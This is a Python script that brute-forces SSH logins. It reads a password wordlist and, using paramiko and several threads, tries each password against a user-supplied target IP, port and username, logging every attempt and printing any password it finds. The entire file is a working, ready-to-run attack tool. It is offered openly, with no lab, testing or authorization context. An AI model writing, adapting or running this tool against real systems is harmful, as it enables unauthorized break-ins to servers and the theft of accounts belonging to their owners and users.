import paramiko
import sys
import os
import threading
import queue
import logging

# Set up logging to track attempts
logging.basicConfig(filename='ssh_bruteforce.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Input parameters from the user
target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))
port = int(input('Please enter SSH port (default is 22): ') or 22)
threads = int(input('Please enter number of threads (default is 5): ') or 5)

# Queue for managing password attempts
password_queue = queue.Queue()

# SSH connection attempt
def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password, timeout=5)
        logging.info(f'Success: Password found: {password}')
        print(f'Password found: {password}')
        exit(0)
    except paramiko.AuthenticationException:
        logging.info(f'Failed: {password}')
    except Exception as e:
        logging.error(f'Error with password {password}: {str(e)}')
    finally:
        ssh.close()

# Worker function for threads
def worker():
    while not password_queue.empty():
        password = password_queue.get()
        ssh_connect(password)
        password_queue.task_done()

# Load the password file and populate the queue
if os.path.exists(password_file):
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            password_queue.put(password)
else:
    print(f'Password file {password_file} does not exist.')
    sys.exit(1)

# Start the brute force attack using threading
for _ in range(threads):
    t = threading.Thread(target=worker)
    t.daemon = True  # Allow threads to exit cleanly on program termination
    t.start()

# Wait for the queue to be emptied
password_queue.join()

print('Brute force attack completed. Check ssh_bruteforce.log for details.')
